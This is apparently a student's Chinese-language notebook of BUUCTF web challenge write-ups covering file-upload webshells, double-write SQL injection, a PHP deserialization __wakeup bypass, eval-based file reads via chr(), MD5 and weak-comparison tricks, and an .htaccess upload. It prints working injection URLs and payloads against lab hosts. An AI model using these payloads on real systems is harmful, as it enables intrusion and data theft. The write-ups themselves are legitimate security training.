---
description: 记录蛤
---

# 💔 刷题wp

## （1）\[极客大挑战 2019]Upload 1

<figure><img src="../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

其实很明显的就知道考的是文件上传漏洞，

先交了个空的后缀名为jpg的文件，发现他其实能识别出来图片。

<figure><img src="../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

所以我先直接放一张图片。后面发现jpg和png都不行，都是说

<figure><img src="../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

发现可能是我的思路不对。我决定直接抓个包看看。

<figure><img src="../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

看看前端能不能直接绕过。

<figure><img src="../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

被识别出来了是php。然后用了畸形的php2，php3，php4，php5，pht，全部都被ban了

<figure><img src="../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

然后我们用phtml时，结果是成功的。并且还提示了，我的文件包括了\<?。

<figure><img src="../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

所以我们可能代码厘米不能含有\<?，所以我们需要用其他的变形方式来替代了。就是用js标签的方式

<figure><img src="../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

发现还是检测出来不是图片了，我们可能是需要添加文件头来绕过他的判断。所以添加文件头需要转化为ascii码GIF&'=

<figure><img src="../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

可以看到上传成功了。然后我们查看upload/1.phtml看看是否上传成功

<figure><img src="../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

成功了，我们再输入我们需要的指令。其实这个在我查看路径的过程中我发现了这个的麻烦之处，就是他的flag的存放路径有点难找，所以这里我是用的antsword（蚁剑）

<figure><img src="../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

***

## （2）\[ACTF2020 新生赛]Upload 1

<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

点击那个灯泡就有了文件上传，应该还是文件上传漏洞。随便上传一张图片。

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

我们可以发现上传的文件的路径是在/uplo4d/下面。我们还是尝试抓包。

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后改包上传我们的木马语句，然后发现识别出来是bad file，我们在文件前面加图片头试试。

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

发现加了文件头还是失败，后面我们修改了文件后缀，我们直接用的phtml，不知道为什么也就他可以，然后结果就发现出来了。上传成功了。

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后去到那个文件下面，发现成功了。

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

直接连接antsword了，毕竟这上面的题目的路径都很复杂。

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## (3)\[极客大挑战 2019]BabySQL 1

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

感觉这个应该有一些过滤或者什么的。随便试试一个闭合

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后发现or没了，所以怀疑一些关键词or and这种都被过滤了。后面还发现，order by因为前面有or，也被过滤了啦，太离谱了有点。后面发现union，select这种全部被过滤了。

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

对于过滤的方式，我们采用双写的方式绕过这个过滤。然后联合查询看看到底有几列。

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

其实这种一般也就3，4列，结果3刚好就试出来了。并且他的回显我们看到，他是hello后面显示第二列的，密码显示第三列的，其实第二和第三都有回显，那么我们可以在这里做一些文章了。

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

首先查询数据库名了。

```url
http://a21dc942-8a66-4a7d-bd94-c355dfbad89e.node5.buuoj.cn:81/check.php?username=admin&password=admin%27+uunionnion+selselectect+1,database(),3+%23
```

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

好好数据库名为geek，查看表名，这里有个坑就是or被过滤了，需要双写，你说好不好玩。

```
http://a21dc942-8a66-4a7d-bd94-c355dfbad89e.node5.buuoj.cn:81/check.php?username=admin&password=admin%27+uunionnion+selselectect+1,group_concat(table_name),3+frfromom infoorrmation_schema.tables whwhereere table_schema='geek'+%23
```

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

这里有两张表，b4bsql,geekuser。我猜是这个geekuser有信息哦。查查列名吧。

```
http://a21dc942-8a66-4a7d-bd94-c355dfbad89e.node5.buuoj.cn:81/check.php?username=admin&password=admin%27+uunionnion+selselectect+1,group_concat(column_name),3+frfromom infoorrmation_schema.columns whwhereere table_name='geekuser'+%23
```

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

很明显，是这个，三个列，username，id，password，三个。直接看吧。password别忘了双写，真的荒谬。

```
http://a21dc942-8a66-4a7d-bd94-c355dfbad89e.node5.buuoj.cn:81/check.php?username=admin&password=admin%27+uunionnion+selselectect+1,group_concat(passwoorrd),3+frfromom geek.geekuser+%23
```

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

阿哲，其实这个时候竟然不是，我人傻了，难道是错了一个表应该。是另外一个表。我服了。

```
http://a21dc942-8a66-4a7d-bd94-c355dfbad89e.node5.buuoj.cn:81/check.php?username=admin&password=admin' uniunionon selselectect 1,group_concat(passwoorrd),3 frfromom geek.b4bsql %23
```

果然flag在这里。

<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

Syclover @ cl4y

Login Success!

Hello i\_want\_to\_play\_2077,sql\_injection\_is\_so\_fun,do\_you\_know\_pornhub,github\_is\_different\_from\_pornhub,you\_found\_flag\_so\_stop,i\_told\_you\_to\_stop,hack\_by\_cl4y,flag{7a63c8bc-9eef-43cd-9b56-bce0ecce2961}！

Your password is '3'

***

## （4）\[极客大挑战 2019]PHP 1

<figure><img src="../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

其实它提示了，我需要去查看他的备份的php文件，但是这个知识点我之前没有涉猎过，所以我会补充一下这个知识点。扫描目录这个时候需要用到工具。我也不知道，其实之前老师讲过，但是没有太记下来我真服了。

在后面的web常用工具介绍了，可以看看。 [#id-1.dirsearch](../gong-ju-jie-shao/web-chang-yong-gong-ju.md#id-1.dirsearch "mention")

然后我们扫描这个目录。

```
dirsearch -u http://430242be-4302-48a1-9751-df8ccc88bec4.node5.buuoj.cn:81/ -e php
```

然后因为实在是太多了，光是php就有8000多，所以我们直接看wp说有www.zip这个文件，其实感觉有点难判断怎么是www.zip文件的。

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

可以看到这个里面有一个flag.php文件

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

打开发现里面好像不是我们要找的flag。

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

这里还有一个class.php,然后打开发现是类之类的，猜测是反序列化漏洞。

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

还要配合index.php里面确定是反序列化漏洞

<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

其实很明显就是如果要显示flag的话是要求username为admin，password为100的，并且\_\_wakeup（）函数不能执行，因为在反序列化的时候会执行这个函数，如果要绕过wakeup的话，我们需要属性数变大就能绕过这个函数。然后我们写一个php脚本来序列化我们的结果。

```php

<?php

class Name{
    private $username='admin';
    private $password=100;

}

$a=new Name();
echo serialize($a);

```

得到的结果是

```
O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
```

又因为要绕过，把对象2改成3就可以了。

```
O:4:"Name":3:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
```

利用select参数传过去。这个select参数我们可以从index.php的文件里面看到这个参数

这里需要注意一点是我之前总结了笔记但是没有彻底理解的地方，我们用的是private模式，所以其实我们可以看到他显示的是14个·大小，因为前面和后面都有%00，然后我们在从网页上复制粘贴下来的时候是没有的，所以我们需要人为的添加这个%00，所以最后我们得到的应该是

```
O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```

这样才能得到flag。

<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## （5）\[ACTF2020 新生赛]BackupFile 1



<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

其实他的提示也是找到源文件。

刚刚用过一个dirsearch，这一次也来试试。

<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

有index.php.bak，这个备份文件，我们在常用后缀里面有介绍过它的存在。

<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

查看这个文件发现

<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

感觉这个考的是php特性的弱比较，所以我们直接传入$key是个数字并且为123就可以了。

得到flag。

<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

***

## （6）\[RoarCTF 2019]Easy Calc 1

<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

就是一个简单的计算器，不知道随便试试，不知道考啥现在还。

查看源码发现写了一句设置了waf去确保安全

<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

发现有一个calc.php进行计算的，我们去查看这个文件。直接看到源码了，也发现了过滤规则

<figure><img src="../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

这里有一个函数eval（）代码执行函数，这个主要是考察RCE漏洞啊，但是他过滤了很多单引号，双引号，dollar之类的全部过滤了，只有用无参数的读取文件了。这里可以参考 [#id-6.-wu-can-shu-du-qu](../rce-yuan-cheng-dai-ma-zhi-hang/代码执行知识点总结.md#id-6.-wu-can-shu-du-qu "mention")

并且这里calc计算机不允许传入字母，因为会出现识别不了的情况，所以我们这个地方补充了怎么绕过这个waf的方法。 [#id-2.-chuan-can-bu-yun-xu-han-you-zi-mu](buuctf-bu-chong-zhi-shi-dian.md#id-2.-chuan-can-bu-yun-xu-han-you-zi-mu "mention")

所以我们输入以下的，是查看当前目录下面的目录有哪些。

```
http://node5.buuoj.cn:29062/calc.php? num=var_dump(scandir(chr(46)))
```

<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

然后查看根目录下面的文件有哪些。

```
http://node5.buuoj.cn:29062/calc.php? num=print_r(scandir(chr(47)))
```

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

看到有一个flagg，我们应该就是要进入这个目录下面去查看。我发现这个时候用chr和.是最好用的。其实后面尝试后发现这个不是一个目录，是一个文件。

```
http://node5.buuoj.cn:29062/calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
```

<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## （7）\[BJDCTF2020]Easy MD5

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

这个知识点之前在总结的时候并没有好好总结完，所以这里补充了md5（）函数的绕过的知识点，这个知识点好像是在sql注入里面的。我们补充了这个知识点在sql注入里面。

并且这个触发点也不是在我们平常看到的地方，是在响应头里面。

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

我们可以看到在里面有一个hint，并且是md5（password，true）绕过，所以我们向pass输入ffifdyop

<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

然后跳转到另外一个php文件

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

查看源码我们可以发现他的php代码

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

很明显这是我们php特性里面的==弱比较和md5（）的特性。

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

我们传入里面的随便两个就可以。

<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

传入之后跳转到另外一个php文件了，需要post传入的结果不相等，但是md5得完全相等，我们可以通过传入两个数组去绕过。

<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

***

## （8）\[极客大挑战 2019]BuyFlag 1

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

刚打开真的不知道要干嘛，然后看到有一个payflag网页，进入然后说得要是cuit的学生，并且要回答正确的密码。

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

查看源码发现有php代码

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

利用的是php弱比较

然后输入以404开头的字符串，比如404abc之类的。这完成了第二个要求，还有一个，判断你是cuit的成员，我们抓个包尝试一下。

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

发现cookie上面有个user=0，应该是user=1就是认为你是cuit的成员。

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

然后出现了另外的要求，需要很多钱

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

所以我们post传入money和password，并且把user改为1就成了应该。

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

但是他显示我的钱的数字位数太长了，那我们得换一种表示方式用科学计数法绕过，1后面9个零表示1e9

得到flag。

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

***

## （9）\[HCTF 2018]admin 1

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

看不出什么，查看一下源码

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

提示我了，我不是admin，然后我们注册登录之类的。提示说admin被人注册了，就说明，我们要用admin的账号登录，那么我们知道username=admin，就要知道密码。

应该是弱密码，我随便输入了一个123，就出来了flag，甚至都不需要我爆破，我是欧皇。

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

***

## （10）\[MRCTF2020]你传你🐎呢 1

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

应该是个文件上传漏洞。要传一句话木马大概是。

上传了一个一个话木马的jpg文件发现上传成功了。

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

我们抓个包。

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

然后发现上传失败了。

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

后面看到是要上传.htaccess文件，其实在这个时候感觉上传这种文件不知道是怎么判断出来的，但是他既然是这样那我们就传.htaccess文件吧。那我们就写一个让他把png文件可以当错php代码来执行的.htaccess文件

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

然后我们传一个一句话木马

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

然后用as去连接

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

得到flag。

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

***

## （11）\[护网杯 2018]easy\_tornado 1（未写）

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

拿到之后就看了flag.txt文件，然后看了

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

结果进去那个目录是个404，还是自己写的，然后就知道肯定不对。然后就看了hints.txt，说要cookie\_secret，就是cookie有点什么？然后filename还进行了md5加密

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

确实看到后面有一个filehash

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

然后welcome里面有一个render不知道这是啥搜搜吧。还有那个tornado完全不知道是个jier

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

不会写之后再写太难了。这个知识点晚点再学。

***

## （12）\[ZJCTF 2019]NiZhuanSiWei 1

<figure><img src="../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

应该是个反序列化漏洞



















